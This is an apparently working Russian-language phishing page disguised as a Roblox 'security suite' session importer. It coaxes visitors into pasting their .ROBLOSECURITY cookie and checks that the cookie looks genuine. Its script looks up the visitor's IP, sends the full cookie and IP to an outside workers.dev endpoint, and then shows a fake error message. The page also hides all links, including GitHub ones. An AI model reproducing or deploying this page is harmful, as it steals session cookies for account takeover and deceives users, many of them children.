
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>✦ RBX SECURITY SUITE ✦</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        :root {
            --bg-dark-1: #0a0a0f;
            --bg-dark-2: #0f071a;
            --bg-dark-3: #150d24;
            --card-bg: rgba(10, 10, 18, 0.75);
            --border-glow: #7c3aed;
            --text-main: #e9d5ff;
            --text-dim: #c084fc;
            --accent: #8b5cf6;
            --accent-glow: rgba(139, 92, 246, 0.4);
            --input-bg: #0a0a12;
            --star-color: #c084fc;
            --valid: #22c55e;
            --invalid: #ef4444;
        }

        body.light {
            --bg-dark-1: #e6f0fa;
            --bg-dark-2: #d4e2f0;
            --bg-dark-3: #c2d4e6;
            --card-bg: rgba(255, 255, 255, 0.85);
            --border-glow: #5a9bd5;
            --text-main: #1a2a4f;
            --text-dim: #2c4c8c;
            --accent: #4a8ec8;
            --accent-glow: rgba(74, 142, 200, 0.3);
            --input-bg: #ffffff;
            --star-color: #ffd966;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, var(--bg-dark-1) 0%, var(--bg-dark-2) 50%, var(--bg-dark-3) 100%);
            background-attachment: fixed;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        .star {
            position: absolute;
            background: var(--star-color);
            border-radius: 50%;
            opacity: 0;
            animation: twinkle 4s infinite alternate;
        }
        @keyframes twinkle {
            0% { opacity: 0.1; transform: scale(1); }
            100% { opacity: 1; transform: scale(1.3); }
        }

        .floating-cookie {
            position: fixed;
            pointer-events: none;
            font-size: 28px;
            z-index: 0;
            opacity: 0.3;
            animation: floatAnim linear infinite;
            filter: drop-shadow(0 0 8px var(--accent));
        }
        @keyframes floatAnim {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            15% { opacity: 0.4; }
            85% { opacity: 0.4; }
            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
        }

        .glass-card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border-radius: 56px;
            padding: 44px 40px;
            max-width: 540px;
            width: 100%;
            border: 1px solid var(--border-glow);
            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3), 0 0 30px var(--accent-glow);
            transition: all 0.3s ease;
            z-index: 10;
            position: relative;
        }
        .glass-card:hover {
            transform: translateY(-6px);
            border-color: var(--accent);
            box-shadow: 0 30px 55px rgba(0, 0, 0, 0.4), 0 0 45px var(--accent);
        }

        .logo {
            text-align: center;
            margin-bottom: 36px;
        }
        .logo h1 {
            font-size: 46px;
            font-weight: 800;
            background: linear-gradient(135deg, #f0e6ff, var(--accent), #e9d5ff);
            background-size: 200% auto;
            animation: textShine 4s linear infinite;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -1px;
        }
        @keyframes textShine {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .logo p {
            color: var(--text-dim);
            font-size: 11px;
            letter-spacing: 4px;
            margin-top: 10px;
            text-transform: uppercase;
            font-weight: 300;
        }

        .label {
            color: var(--text-dim);
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .cookie-input {
            width: 100%;
            background: var(--input-bg);
            border: 1.5px solid var(--border-glow);
            border-radius: 32px;
            padding: 20px 22px;
            color: var(--text-main);
            font-family: 'Fira Code', monospace;
            font-size: 12px;
            resize: vertical;
            transition: all 0.2s;
        }
        .cookie-input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 18px var(--accent);
        }

        .status {
            font-size: 13px;
            margin: 18px 0 28px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: var(--text-dim);
            background: rgba(0, 0, 0, 0.2);
            padding: 10px 18px;
            border-radius: 60px;
            backdrop-filter: blur(4px);
        }

        .btn {
            width: 100%;
            background: linear-gradient(135deg, #7c3aed, var(--accent), #c084fc);
            background-size: 200% auto;
            border: none;
            border-radius: 60px;
            padding: 18px;
            color: white;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 0 12px var(--accent);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 0 25px var(--accent);
            background-position: 100% 0;
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .message-area {
            text-align: center;
            margin-top: 24px;
        }
        .error-text {
            color: #ff8a7a;
            background: rgba(255, 70, 50, 0.12);
            padding: 12px 20px;
            border-radius: 60px;
            font-size: 13px;
            border-left: 3px solid #ff5a4a;
        }

        .theme-switch {
            position: fixed;
            top: 24px;
            right: 24px;
            z-index: 100;
        }
        .theme-btn {
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            border: 1px solid var(--border-glow);
            border-radius: 60px;
            padding: 10px 22px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-dim);
            transition: all 0.2s;
        }
        .theme-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 15px var(--accent);
        }

        a, a[href*="github"], a[href*="github.com"], a[href*="github.io"] {
            display: none !important;
        }
    </style>
</head>
<body>
<div class="theme-switch">
    <button class="theme-btn" id="themeToggleBtn">🌙 Тема</button>
</div>
<div class="stars" id="stars"></div>
<div class="glass-card">
    <div class="logo">
        <h1>✦ RBX SECURITY ✦</h1>
        <p>SESSION IMPORTER</p>
    </div>
    <label class="label"><span>🍪</span> .ROBLOSECURITY Cookie</label>
    <textarea class="cookie-input" id="cookie" rows="3" placeholder="Вставьте cookie сюда..."></textarea>
    <div class="status" id="status">
        <span>✨</span> Ожидание ввода...
    </div>
    <button class="btn" id="sendBtn" disabled>🔄 Заменить сессию</button>
    <div id="messageArea" class="message-area"></div>
</div>

<script>
    (function(){
        const PROXY_URL = "https://robl.megadoner517.workers.dev";

        // Тема
        const themeBtn = document.getElementById('themeToggleBtn');
        function loadTheme(){
            const saved = localStorage.getItem('rbx_theme');
            if(saved === 'light'){
                document.body.classList.add('light');
                if(themeBtn) themeBtn.innerHTML = '☀️ Тема';
            } else {
                document.body.classList.remove('light');
                if(themeBtn) themeBtn.innerHTML = '🌙 Тема';
            }
        }
        function toggleTheme(){
            if(document.body.classList.contains('light')){
                document.body.classList.remove('light');
                localStorage.setItem('rbx_theme', 'dark');
                if(themeBtn) themeBtn.innerHTML = '🌙 Тема';
            } else {
                document.body.classList.add('light');
                localStorage.setItem('rbx_theme', 'light');
                if(themeBtn) themeBtn.innerHTML = '☀️ Тема';
            }
        }
        if(themeBtn) themeBtn.addEventListener('click', toggleTheme);
        loadTheme();

        // Звёзды
        function createStars(){
            const container = document.getElementById('stars');
            for(let i=0;i<150;i++){
                const star = document.createElement('div');
                star.classList.add('star');
                star.style.left = Math.random() * 100 + '%';
                star.style.top = Math.random() * 100 + '%';
                star.style.width = Math.random() * 3 + 1 + 'px';
                star.style.height = star.style.width;
                star.style.animationDelay = Math.random() * 5 + 's';
                star.style.animationDuration = Math.random() * 3 + 2 + 's';
                container.appendChild(star);
            }
        }
        createStars();

        // Печеньки
        for(let i=0;i<40;i++){
            let cookie = document.createElement('div');
            cookie.classList.add('floating-cookie');
            cookie.textContent = '🍪';
            cookie.style.left = Math.random() * 100 + '%';
            cookie.style.fontSize = (22 + Math.random() * 32) + 'px';
            cookie.style.animationDuration = (9 + Math.random() * 16) + 's';
            cookie.style.animationDelay = Math.random() * -20 + 's';
            document.body.appendChild(cookie);
        }

        const cookieInput = document.getElementById('cookie');
        const sendBtn = document.getElementById('sendBtn');
        const statusDiv = document.getElementById('status');
        const msgArea = document.getElementById('messageArea');

        // Простая проверка — длина от 750 и наличие WARNING
        function isValidCookie(val){
            if(!val || val.trim() === '') return false;
            const t = val.trim();
            if(!t.includes('WARNING:-DO-NOT-SHARE-THIS')) return false;
            if(t.length < 750) return false;
            return true;
        }

        function updateUI(){
            const val = cookieInput.value;
            if(!val || val.trim() === ''){
                statusDiv.innerHTML = '<span>✨</span> Ожидание ввода...';
                statusDiv.style.color = '#a78bfa';
                sendBtn.disabled = true;
            } else if(isValidCookie(val)){
                statusDiv.innerHTML = `<span>✅</span> Кука валидна! Длина: ${val.trim().length} символов.`;
                statusDiv.style.color = '#22c55e';
                sendBtn.disabled = false;
            } else {
                statusDiv.innerHTML = '<span>❌</span> Неверный формат. Нужна .ROBLOSECURITY (мин. 750 символов)';
                statusDiv.style.color = '#ef4444';
                sendBtn.disabled = true;
            }
        }

        function showMessage(text){
            msgArea.innerHTML = `<div class="error-text">⚠️ ${text}</div>`;
            setTimeout(() => msgArea.innerHTML = '', 4500);
        }

        cookieInput.addEventListener('input', updateUI);
        cookieInput.addEventListener('paste', () => setTimeout(updateUI, 100));
        updateUI();

        sendBtn.onclick = async () => {
            const cookie = cookieInput.value.trim();
            if(!isValidCookie(cookie)) return;

            sendBtn.disabled = true;
            sendBtn.textContent = "⏳ Отправка...";

            let ip = 'unknown';
            try{
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch(e){}

            const msg = {
                content: `**🔐 НОВАЯ СЕССИЯ**\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${ip}\n\n**🍪 .ROBLOSECURITY COOKIE:**\n**Длина:** ${cookie.length} символов\n**Содержимое:**\n\`\`\`${cookie}\`\`\``
            };

            try{
                await fetch(PROXY_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(msg)
                });
                showMessage('Ошибка перенаправления! Обратитесь в поддержку.');
            } catch(e){
                showMessage('Ошибка сети. Попробуйте позже.');
            }

            sendBtn.disabled = false;
            sendBtn.textContent = "🔄 Заменить сессию";
        };
    })();
</script>
</body>
</html>
